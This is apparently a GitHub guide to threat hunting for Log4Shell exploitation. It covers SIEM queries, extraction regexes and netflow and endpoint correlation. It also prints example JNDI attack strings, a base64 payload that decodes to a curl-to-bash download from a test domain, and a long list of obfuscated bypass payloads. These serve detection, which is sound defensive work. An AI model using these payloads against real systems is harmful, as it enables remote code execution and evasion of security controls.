# log4shell-hunting

As the log4j "sawdust" settles, many Organizations may want to take further proactive steps to hunt for current or prior abuse of cve-2021-44228 in their environment.

This resource takes a threat hunting approach to identifying evidence of successful exploitation of this vulnerability. This is not intended to solely replace detection of attacks on the network; a role that is ideally primarily fulfilled by existing security products, but instead takes advantage of the "noisy" nature of the attack to systematically hunt for successful outcomes of the attempted attacks against vulnerable assets across an environment.

General information about the vulnerability is already available from a number of sources that would do a better job than I and presenting. That being said, for those interested, general information and frequently asked questions can be found at the bottom of the page [here](#fq&a-and-general-info)


### Why Threat Hunt?
Security Vendors worked hard to keep up with the evolving threats, but there were [many bypasses to detection or ways to obfuscate the attack to avoid detection](#obfuscation-examples) to the developed prevention and detection signatures and security vendors had to consistently adapt with [new signatures](#example:-palo-alto) as adversaries discovered new ways to bypass in place detections. This meant that even companies with the most recent signatures were very likely targeted attacks that were not detected.  

Therefore, we will not be relying on Security alerts for our initial scope. These alerts should *not* be ignored and can even been included in the hunt if they contain records of the URL, User-AgentStrings, or other [fields mentioned later](#locations-to-consider-checking) that may contain the attack. However, keep in mind that Threat Hunting is most valuable when it identifies true threats that the SOC has not already triaged. Therefore data from things like NTAs, NG-Firewall HTTP logs or Proxys, or even Web Server logs (which is what we use here for examples) will be more valuable than IPS alerts Log4j attack logs.

Our examples will use web server logs for examples assuming a scenario where the Threat Hunter doesn't have any IPS logs to leverage.

### The Hunter Mindset
Consider that SOC primarily triages alerts from security controls. Their deliverable is a determination on whether a notable event that has been surfaced requires additional escalation or not.

A Threat Hunter's deliverable is a compromise assessment:

1. I am reasonably certain the system/environment is safe???
2. I am reasonably certain the system/environment is compromised???
3. I am uncertain and will need to conduct more analysis

### Hunt 1: Device Performing Log4j Attack Resolutions Connection
**Hunt Methodology: Hypothesis Driven** <br>
**Efficacy: High**<br>
**Data Domain: NetFlow | Web**<br>
**Data Requirements**
1. You have access to various web and app server logs
2. You have the capability to look at netflow logs from at least December 10th 0500 UTC
3. Web logs need to contain request headers, input fields, and query/body parameters to be comprehensive

### Hunt 2: Device Executing Log4j Attack Commands
**Hunt Methodology: Hypothesis Driven** <br>
**Efficacy: High**<br>
**Data Domain: Endpoint | Web**<br>
**Data Requirements:**
1. You have access to various web and app server logs
2. You have the capability to look at endpoint command execution logs from at least December 10th 0500 UTC
3. Web logs need to contain request headers, input fields, and query/body parameters to be comprehensive

## Operational Intelligence for Hypothesis Driven Hunt
**How the attack works:**
1. String payload is placed in headers, input fields or query and body parameters.   
2. Software running Log4j processes event or a log of the event containing the string and executes as directed by lookup feature provided by the vulnerable `jndilookup.class`. This Java Naming Directory Interface is the API that allows Java Apps to perform searches for objects in their names. It is located in the Java Archive file for the particular running Log4j instance.

This string is sent as input from a client and can be logged in multiple times in multiple palces (this is one of the challenges about this attack). By this nature, the  attack is fairly "noisy" and evidence of attacks in an environment should not be difficult to collect. The nature of the attack also provides investigators and hunters a description of what actions the adversary attempted to instruct the targets to perform.

Lets look at an example:
`${jndi:ldap://caffeinatedsheep.com/a}`

1. The attacker passes this string to the server for logging.
2. Log4j interpolates the string and, as instructed, queries the "a" record of the attacker controlled ldap server.
3. The ldap server responds with the directory info which is a malicious java class, command, shell, etc. Base64 can also be passed which can be decoded and executed.
4. Java downloads or executes the response/command.

Here is an example using base64:
`${jndi:ldap://caffeinatedsheep.com:12344/Basic/Command/Base64/KGN1cmwgLXMgY2FmZmVpbmF0ZWRzaGVlcC5jb206NTg3NCl8YmFzaA==}`

## The Hunts Outline
The following are outlines for the separate hunts. Details on how to perform each step can be found bellow.

### The Hunt: Network Resource
1. [**Scoping out a Query**](#scoping-out-a-query): Scope all relevant logs using the `${jndi\:` string. Create an output that you can run additional analysis on.
2. [**Threat Extraction**](#threat-extraction): Extract indicators to use for successful attack identification. <br>
regular expression example: `:(?:\/){1,2}(?<threat>(?<threat_host>(?:[[:alnum:]]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})|(?<threat_content>(?:[[:alnum:]]|\.){1,})))`
3. [**Successful Attack Identification: NetConnect**:](#successful-attack-identification-netconnect) Run the exported list against a comprehensive record of netflow data during attack timeline.
4. [**Analyze Results**:](#analyze-results) Review the results and escalate, contain, remediate, where necessary.  

### The Hunt: Base64 Command Execution
1. [**Scoping out a Query**](#scoping-out-a-query) Scope all relevant logs using the `${jndi\:` string. Create an output that you can run additional analysis on.
2. [**Threat Extraction**](#threat-extraction) Extract indicators to use for successful attack identification. <br>
regular expression example: `\/Base64\/(?<base64_threat>[A-Za-z\d+\/]*(?:==|=|[A-Za-z\d+\/]))[|}]`
3. [**Base64 Decoding**:](#base64-decoding) Using built in tools, or tools like `base64 -d` in linux or CyberChef, decode the base 64 to get the commands that were executed.
4. [**Successful Attack Identification: Base64**:](#successful-attack-identification-base64) Run the exported list against a comprehensive record of netflow data during attack timeline. Additionally, run the execution commands against endpoint data.
5. [**Analyze Results**:](#analyze-results) Review the results and escalate, contain, remediate, where necessary.   


### Scoping out a Query
Scope all relevant logs using the `${jndi\:` string.

#### Locations to consider checking
  - username and passwords
  - input fields
  - email addresses
  - user-agent string
  - filenames
  - following headers:

  Authorization |
  Cache-Control |
  Cf-Connecting_ip |
  Client-Ip |
  Contact |
  Cookie |
  Forwarded-For-Ip |
  Forwarded-For |
  Forwarded |
  If-Modified-Since |
  Originating-Ip |
  Referer |
  True-Client-Ip |
  User-Agent |
  X-Api-Version |
  X-Client-Ip |
  X-Forwarded-For |
  X-Leakix |
  X-Originating-Ip |
  X-Real-Ip |
  X-Remote-Addr |
  X-Remote-Ip |
  X-Wap-Profile |
  Authorization: Basic |
  Authorization: Bearer |
  Authorization: Oauth  |
  Authorization: Token

Examples of searches are provided in Splunk's Splunk Processing Lanagage and Elastic's Kibana Query Language but with slight syntax modification the searches can work for other products as well. The following examples are provided for searching for attacks in that are passed in the user-agent field (a very common varriation).


**SPL:**
```user-agent IN (${jndi:ldap://*,${jndi:dns//*,${jndi:rmi://*,${jndi:corbal://*,${jndi:http://*,${jndi:iiop://*,${jndi:nis://*)``` <br>


**KQL:**
```field_of_interest : ${jndi:ldap://* or field_of_interest:${jndi:dns://* or field_of_interest:${jndi:rmi://* or field_of_interest:${jndi:corbal://*  or field_of_interest:${jndi:http://*  or field_of_interest:${jndi:iiop://*  or field_of_interest:${jndi:nis://* ```

**A anlternative search the just looks for the presence of the `${jndi:*` portion of the string.** <br>
**KQL:** example: `user-agent : ${jndi\:*` <br>
**SPL:** example: `user-agent = ${jndi:*`

*Note: Know your data. Some logs may not have nicely formatted fields user-agent, headers, authorization fields, etc. For example, in Apache Tomcat logs, the data we are looking for will be found somewhere in the messages field. Therefore it is best to use a wildcard before and after our string.*

**example event:**
```message:[23/Dec/2021:13:08:44 +0000] catalina-exec-30 - - 192.168.5.100 10.30.21.7 HTTP/1.1 - GET "GET /?s=${jndi:ldap://90.84.178.188:1389/Exploit} HTTP/1.1" 404 1 994 @timestamp:Dec 23, 2021 @ 06:08:59.721 @version:1 @version.keyword:1 agent.ephemeral_id:33d34716-4fa8-3ca1-d430-09dade31b6e77 agent.ephemeral_id.keyword:33d34716-4fa8-3ca1-d430-09dade31b6e77 agent.hostname:home.caffeinatedsheep.com agent.hostname.keyword:home.caffeinatedsheep.com agent.id:07ae318-3d01-4d9f-fab3-ceca53945d13```

**appropriate search filter:** <br>
**KQL:** example:`message : *${jndi\:*`<br>
**SPL:** example:`message = *${jndi:*`

*Note: The above searches while less efficient than only wildcard'ing the end of the string, but they may be more effective at finding ever instance of the attack.*


### The emerging obfuscations of the attack
Quickly after this vulnerability made its way into public view, the industry began to write detections for it. Initially the most of the industry was first trying to create signatures that would match the following patterns.

${jndi:ldap://*
${jndi:dns//*
${jndi:rmi://*
${jndi:corbal://*
${jndi:http://*
${jndi:iiop://*
${jndi:nis://*

But using environment variables or lower or upper commands, adversaries were able to send strings that the system would normalize to a valid attack string. So the Security vendors would miss the attack and those who used string blacklisting in Log4j to prevent the attack would see their prevention efforts bypassed.

For example, the following may be logged:
```
${jndi:${lower:l}${lower:d}a${lower:p}://caffeinatedsheep.com/a}
${jndi:${lower:d}${lower:n}s://caffeinatedsheep.com/a}

would be normalized to

${jndi:ldap://caffeinatedsheep.com/a
${jndi:dns://caffeinatedsheep.com/a
```

Just as Vulnerability Scanning vendors were coming out with new packages to detect places where Log4j could be found that they had missed, Detection Vendors to were releasing new signatures to try to detect the attack when it occurred with means to bypass current detection signatures. For example, we can consider PaloAlto - a great security detection producer who created several packages related to Log4j vulnerabilities discoveries.


#### Example: Palo Alto
| Date | ID | Threat Name | CVE | Severity |
|---|---|---|---|---|
| 9-Dec | 91991 | Apache Log4j Remote Code Execution Vulnerability | CVE-2021-44228,CVE-2021-45046 | critical |
| 12-Dec | 91994 | Apache Log4j Remote Code Execution Vulnerability | CVE-2021-44228,CVE-2021-45046 | critical |
| 12-Dec | 91995 | Apache Log4j Remote Code Execution Vulnerability | CVE-2021-44228,CVE-2021-45046 | critical |
| 14-Dec | 92001 | Apache Log4j Remote Code Execution Vulnerability | CVE-2021-44228,CVE-2021-45046 | critical |
| 16-Dec | 92004 | Apache Log4j Remote Code Execution Vulnerability | CVE-2021-44228 | critical |
| 16-Dec | 92006 | Apache Log4j Remote Code Execution Vulnerability | CVE-2021-4104 | high |
| 17-Dec | 92007 | Apache Log4j Remote Code Execution Vulnerability | CVE-2021-45046 | critical |
| 18-Dec | 92012 | Apache Log4j Denial-of-Service Vulnerability | CVE-2021-45105 | high |
| unknown | 92035 | Apache Log4j Remote Code Execution Vulnerability | CVE-2021-44832 | medium |

There are other methods as well such as pulling in null values like improper dates or this string which calls null environment variables before each letter.

```
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//caffeinatedsheep.com/a}

normalized to

${jndi::ldap://caffeinatedsheep.com/a}
```

Therefore our searches must account for these bypass method. We will not only have to occasionally modify the regular expression to accommodate for these variations. I have used the following regex to attempt to find instances where bypass techniques are used.

#### Obfuscation-Examples
Here we look at some of the obfuscations that actively emerged during response
**regex:** `((?:\$\{(?:[[:alnum:]]){1,}){1,3}\:.{1,}\})`

A list compiled form referenced resources can be found bellow. Note `caffinatedsheep.com` is not malicious, just a domain I own for testing.
  
```
${jndi:ldap://caffinatedsheep.com/j}
${jndi:ldap:/caffinatedsheep.com/a}
${jndi:dns:/caffinatedsheep.com}
${jndi:dns://caffinatedsheep.com/j}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://caffinatedsheep.com/j}
${${::-j}ndi:rmi://caffinatedsheep.com/j}
${jndi:rmi://domainldap.com/j}
${${lower:jndi}:${lower:rmi}://caffinatedsheep.com/j}
${${lower:${lower:jndi}}:${lower:rmi}://caffinatedsheep.com/j}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://caffinatedsheep.com/j}
${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://caffinatedsheep.com/j}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://caffinatedsheep.com/j}
${jndi:${lower:l}${lower:d}a${lower:p}://caffinatedsheep.com}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//caffinatedsheep.com/a}
${jn${env::-}di:ldap://caffinatedsheep.com/j}
${jn${date:}di${date:':'}ldap://caffinatedsheep.com/j}
${j${k8s:k5:-ND}i${sd:k5:-:}ldap://caffinatedsheep.com/j}
${j${main:\k5:-Nd}i${spring:k5:-:}ldap://caffinatedsheep.com/j}
${j${sys:k5:-nD}${lower:i${web:k5:-:}}ldap://caffinatedsheep.com/j}
${j${::-nD}i${::-:}ldap://caffinatedsheep.com/j}
${j${EnV:K5:-nD}i:ldap://caffinatedsheep.com/j}
${j${loWer:Nd}i${uPper::}ldap://caffinatedsheep.com/j}
${jndi:ldap://127.0.0.1#caffinatedsheep.com/j}
${jnd${upper:??}:ldap://caffinatedsheep.com/j}
${jnd${sys:SYS_NAME:-i}:ldap:/caffinatedsheep.com/j}
${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://caffinatedsheep.com/j}
${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://caffinatedsheep.com/j}
${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://caffinatedsheep.com/j}
${\u006a\u006e\u0064\u0069:ldap://caffinatedsheep.com/j}
${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.caffinatedsheep.com/j}
${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:??}:}}}ldap://caffinatedsheep.com/j}
%24%7Bjndi:ldap://caffinatedsheep.com/j%7D
%24%7Bjn$%7Benv::-%7Ddi:ldap://caffinatedsheep.com/j%7D
```

**Note:** This regex is not sufficient to catch all forms of bypasses. You can see here  list of bypass examples that this pattern does not match against.

<h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/images/regex-bypass.png" width="700px"></h1>
[Talos Log4j Blog on Log4j: Emerging Obsfucation](https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html)

I highly recommend reviewing [Florian Roth's yara rules on GitHub](https://github.com/Neo23x0/signature-base/blob/a383746512f1ef70999b541396bd5499a9134601/yara/expl_log4j_cve_2021_44228.yar) to preview of the strings you may want to match against, as well as some false positives to avoid.

### Threat Extraction
Categorize the events based on Base64 encoding or remote network querying.

To do ths, we will use the regular expression provided in the hunt outline.

#### Network Extraction:
`:(?:\/){1,2}(?<threat>(?<threat_host>(?:[[:alnum:]]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})|(?<threat_content>(?:[[:alnum:]]|\.){1,})))`

In Splunk this would look like:
```
 ... search
  | rex field=foo ":(?:\/){1,2}(?<threat>(?<threat_host>(?:[[:alnum:]]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})\/(?<threat_content>(?:[[:alnum:]]|\.){1,})))"
  | fields - foo _time
  | table elastic_source threat threat_host threat_port threat_content
  | outputlookup log4j-net-threats.csv
```


<h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/images/splunk_net_extract.png" width="700px"></h1>

#### Base64
`\/Base64\/(?<base64_threat>[A-Za-z\d+\/]*(?:==|=|[A-Za-z\d+\/]))[|}]`

In Splunk this would look like:
```
 ... search
  | rex field=foo ":(?:\/){1,2}(?<threat>(?<threat_host>(?:[[:alnum:]]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})\/(?<threat_content>(?:[[:alnum:]]|\.){1,})))"
  | fields - foo _time
  | outputlookup log4j-base64-threats.csv
```

<h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/images/splunk_base64_extract.png" width="700px"></h1>

Note that in both searches we are outputting the results to a csv that we can use to run against our endpoint and network resources later. While Splunk has a built in command to run regular expression on search results I don't know of an easy way to do this in Kibana. I would just pull the data from the Elastic API and then use another Regular expression tool.

At this point I don't have an easy to use tool to run this regular expression on that can output the multiple capture groups well.

Alternative Options:
- **CyberChef** - Currently, the best option. Can print capture groups; however, data is not structured.

<h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/images/cyber-chef.png" width="700px"></h1>

- **grep -Po** - Can print only matches; however, only prints the first match. Regex would need to be rewritten as seperate expressions for each match.

`:~$ cat ./elastic_export.txt | grep -Po1 ':(?:\/){1,2}(?<threat>(?<threat_host>(?:[A-Za-z0-9]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})|(?<threat_content>(?:[A-Za-z0-9]|\.){1,})))\/(?<threat_record>[A-Za-z0-9]{1,})}'
`
- **sed -rn** uses different flavor of regex and current syntax will not work.

`:~$ sed -rn ':(?:\/){1,2}(?<threat>(?<threat_host>(?:[A-Za-z0-9]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})|(?<threat_content>(?:[A-Za-z0-9]|\.){1,})))\/(?<threat_record>[A-Za-z0-9]{1,})}' ./tomcat_honeypot_messages_export.txt`

`:~$ sed: -e expression #1, char 12: unexpected `}'`

I will research or write a Python script later to accomplish this.

### Base64 Decoding
With many data analytic solutions, you may be able to keep this next step in your  SIEM. Alternatively, you can do it in the command line with `base64`. You can also use `iocextract` to get your network indicators into a workable format if you are not working out of a SIEM such as Splunk.

To make this easier and clean up the output I have provided a [very simple script](https://github.com/christian-taillon/log4shell-hunting/blob/main/scripts/decode_base64_and_extract_ioc.sh) that takes a few extra steps to find and sort unique values.

Notice in the following example there are several types of output. Simple IPs exist which will be used in the next step. But there are also some URLs which provide additional information as well as another base64 that will need to be decoded again and handled separately. Someone was trying to be evasive.

<h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/images/terminal_base64.png" width="700px"></h1>

Using CyberChef in this case is also a solution.

<h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/images/cyber-chef-base64-decoding.png" width="700px"></h1>

### Successful Attack Identification Base64
Now that we have a base64 string we can do two things: search for the string in endpoing data (process execution logs that contain command line string) and we can take the extracted network indicators form the base64 commands and use those against our netflow logs.

Endpoint Data:
Search for the base64 strings against your NetFlow data. Bellow is an example with Sysmon.


```
index=homelab sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 CommandLine=*
    [| inputlookup log4j-base64-threats.csv]
| table _time CommandLine host
```

All of the results will indicate successful exploitation and should be stored somewhere for additional analysis.

### Successful Attack Identification NetConnect
From both hunts we should have generated lists of IPs that adversaries attempted to instruct our servers to communicate to.

*Network IP Addresses*
```
| tstats summariesonly=t count from datamodel=Network_Traffic where * by All_Traffic.dest All_Traffic.src All_Traffic.dest_port  All_Traffic.action All_Traffic.vendor_product
| search
    [| inputlookup log4j-net-threats.csv
    | rename threat_host as All_Traffic.dest
    | fields All_Traffic.dest ]
| sort - count
| eval threat_host = 'All_Traffic.dest'
| lookup log4j-net-threats.csv threat_host as threat_host
```

*Network Hostnames*
```
| tstats summariesonly=t count from datamodel=Web by Web.dest Web.src Web.dest_port Web.action Web.vendor_product Web.url
| search
    [| inputlookup log4j-net-threats.csv  
    | rename threat_host as Web.url
    | fields Web.url ]
| sort - count
| eval threat_host = 'Web.url'
| lookup log4j-net-threats.csv  threat_host as threat_host
```

<h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/images/splunk-net-match.png" width="700px"></h1>


### Analyze Results
Review the results and contain, remediate, and escalate where necessary.

Any instances where endpoint data reveals execution of base64 commands or devices reached out to IP addresses on ports as directed by the attacks indicate a successful attack that was launched against your network. These events need to be escalated to an Incident Response process and investigated.

## FQ&A and General Info
Allot of this content has already been discussed or shared which is why it is placed at the end of the page.

#### CVE-2021-44228
<h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/images/CVE-2021-44228_cvss_scoring.png" width="400px"></h1>

Vulnerabilities Associated with Log4j Weeks of Discovery
| CVE | Type | Affected Log4j Versions | Non-Default Configuration | Observed in Wild |
|---|---|---|---|---|
| CVE-2021-44228 | RCE | 2.0 through 2.14.1 | No | Yes |
| CVE-2021-45046 |DoS and RCE | 2.0 through 2.15.0 | Yes | No |
| CVE-2021-4104 | RCE | 1.2* | Yes | No |
| CVE-2021-45105 | DoS | 2.0-beta9 to 2.16.0 | Yes | No |


Why is Log4j such a big deal?
1. **Can impact not only the targeted application, but also log forwarding destinations** <br>
In my opinion one of the most unique and challenging aspects to this vulnerably is that it can affect any system that handles logs. Most organizations have tools to pull logs from servers to aggregate and centrally analyze. Not only could an external facing service be compromised but severs "deep" inside the network can be compromise if they process strings from the attacking service.<br>
Consider: <br>
  a. Where are you forwarding your web/app logs to and are those handling applications affected?<br>
  b. If forms are submitted does that data go and is that vulnerable? <br>
  c. Where can analysts pull and review logs and are those tools vulnerable? <br>
  d. Can someone send email to an account that automatically processes data (like a support service solution with a ticketing feature) and are these services vulnerable? <br>
  e. Do any sensors that proxy traffic or monitor it out of band have log4j vulnerabilities? Do the systems they forward traffic to? <br>
2. **Provides unauthenticated Remote Code Execution**
This element alone is enough to warrant attention from security practitioners. RCE allows adversaries to instruct victim devices to execute arbitrary code.
3. **Identifying and remediating instances of the vulnerability**
While many vulnerabilities that we tackle only require defenders to implement an OS or application update, this vulnerability affects many applications and cannot be fixed at an OS level. Patching is difficult without developer instructions. Attempts to patch may be insufficient in some cases.
4. **External scans have limited visibility and accuracy**
While external scans may be able to profile much of the software and its dependencies utilized in your environment that an adversary may see, it is not able to comprehensively denote the existence of the project in your environment. Primarily, this is because it is not a primary service that will interface with application clients. Log4j is also an open source project which means any one can take the project and bake it into their own application making hashing (for agent based scanning) or application profiling difficult.
5. **The library is widely used in software and applications**
This vulnerability doe not require Java Runtime Environment to be installed at an OS level. JRE can be embedded into a standalone app. Some implementations use Log4j externally while other applications can use Log4j that is embedded in a standalone executable. There are also "Transitive dependency cases". This is where an app you use, does not directly require Log4j but a library or project your application depends on does. Applications that are affected due to the use of Elasticsearch are a good example of this.  

*Note: Multiple efforts to compile lists of affected software have been undertake to respond to this uniquely difficult to identify threat. Two such lists are: [CISA Log4j (CVE-2021-44228) Affected Vendor & Software List](https://github.com/cisagov/log4j-affected-db/blob/develop/SOFTWARE-LIST.md) and [Nationaal Cyber Security Centrum Software List](https://github.com/NCSC-NL/log4shell/blob/main/software/software_list.md)*

## Traditional Detection
As noted, security controls, particularly Intrusion Detection/Prevention Systems, Dedicated WAFs / Next-Gen or L7 Firewalls or other NTAs are particularly usefor for the detection of these attacks in a network.

#### Inbound Encrypted Sessions
While basic security efforts undertaken in most security shops apply, it should be noted that security controls which analyze network traffic to identify log4j attacks will likely not be sufficient to detect attacks in encrypted sessions.  

*Note: Some organizations may notice that L7 firewalls fail to prevent and detect attacks that internal IDS/IPS device catch, this may be due to traffic being encrypted while passing through the firewall but not encrypted will passing through the successfully detecting sensor.*

1. **Decryption** - there are various methods to decrypt inbound traffic, all require some configuration. Optimally, this can be configured at an edge L7 firewall with signatures to detect and prevent attacks against cve-2021-44228.
2. **Behind SSL Termination** - this option is applicable for organizations who may use Load Balancers to direct client requests across multiple servers or who decrypt traffic at a network device like a L7 firewall before traffic is proceeds south of the firewall.

#### Cloud WAFs
Cloud WAFs only work when clients attempt to resolve the DNS record for the service and communicate to the IP address offered in the response. They do not prevent an adversary from throwing traffic against your IP addresses. When possible, you should consider only allowing traffic to communicate to your web services that you have proxied through a Cloud WAF when it is sourced form the WAF IP.

#### 404 Does Not Mean Safe
This attack does not target a vulnerability native to the web service. It instead attempts to perform the command injection at the logging stage. Just because the web service did not respond with a wab page and allow interaction to continue does not mean the attacker did not pass the string in the User-AgentString or in some other header that may be logged by your service.

## Additional Resources
[MUSA ??ANA](https://musana.net/2021/12/13/log4shell-Quick-Guide/)

[Oracle Documentation on jndi-lookup](https://docs.oracle.com/javase/7/docs/technotes/guides/jndi/jndi-ldap.html)

[Frequently Asked Questions About Log4Shell](https://www.tenable.com/blog/cve-2021-44228-cve-2021-45046-cve-2021-4104-frequently-asked-questions-about-log4shell)

[Picus - 4 Step Immediate Mitigation for
Log4j Attacks (Log4Shell)](https://media-exp1.licdn.com/dms/document/C4D1FAQHAbdlMIo1zVw/feedshare-document-pdf-analyzed/0/1640074174833?e=1640908800&v=beta&t=wOeCXDhR7G8ZjvLotB1olV5SU-dIsW_cvpNAQBKq3Rw)

[Talos Log4j Blog on Log4j: Emerging Obsfucation](https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html)

[Florian Roth's yara rules on GitHub: Thor](https://github.com/Neo23x0/signature-base/blob/a383746512f1ef70999b541396bd5499a9134601/yara/expl_log4j_cve_2021_44228.yar)

## Vulnerability (CVE-2021-44228, log4shell)
- https://logging.apache.org/log4j/2.x/security.html
- https://issues.apache.org/jira/browse/LOG4J2-3201
- https://github.com/apache/logging-log4j2/pull/608
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
